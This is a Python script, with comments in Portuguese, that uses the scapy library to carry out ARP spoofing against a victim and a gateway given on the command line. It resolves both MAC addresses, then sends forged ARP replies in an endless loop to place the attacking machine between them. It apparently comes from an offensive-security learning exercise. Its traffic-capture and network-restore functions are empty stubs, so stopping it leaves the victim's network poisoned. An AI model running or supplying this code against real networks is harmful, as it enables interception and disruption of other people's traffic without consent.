from multiprocessing import Process
from scapy.all import (ARP, Ether,conf,get_if_hwaddr,
                       send,sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

# Função auxiliar para obter endereço MAC de qualquer maquina.
def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op= "who-has", pdst=target_ip)
    resp, _ = srp(packet,timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

#Classe para envenenar, capturar e restaurar as configurações de redes
class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'{interface} inicializada:')
        print(f'Gateway ({gateway} está em {self.gateway_mac}).')
        print(f'Vítima ({victim}) está em {self.victim_mac}')
        print('-'*30)

    def run(self):
        self.poison_thread = Process(target= self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison (self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac
        #poison_victim.hwsrc = self.gateway_mac
        print(f'ip de origem: {poison_victim.psrc}')
        print(f'ip de destino: {poison_victim.pdst}')
        print(f'mac de destino: {poison_victim.hwdst}')
        print(f'mac de origem: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-'*30)
        
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        #poison_gateway.hwsrc = self.victim_mac
        print(f'ip de origem: {poison_gateway.psrc}')
        print(f'ip de destino: {poison_gateway.pdst}')
        print(f'mac de destino: {poison_gateway.hwdst}')
        print(f'mac de origem: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-'*30)

        print(f'Iniciando o envenenamento ARP. [CRTL+C para interromper]')

        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count = 200):
        pass

    def restore(self):
        pass

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()